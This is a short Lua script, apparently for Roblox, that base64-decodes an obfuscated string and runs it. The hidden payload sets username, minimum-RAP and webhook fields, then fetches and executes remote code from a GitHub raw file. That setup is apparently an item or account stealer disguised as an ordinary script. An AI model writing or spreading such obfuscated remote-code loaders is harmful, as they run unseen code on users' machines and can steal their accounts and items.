
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gImYiClVzZXJuYW1lMiA9ICJmIgpNaW5pbXVtUkFQID0gZgpXZWJob29rID0gImYiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JBS0FqZGRjL05ldy1Tb3VyY2VzL3JlZnMvaGVhZHMvbWFpbi9UUlVMWU5PVEJFTlNDUklQVFMudHh0IiwgdHJ1ZSkpKCkK"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
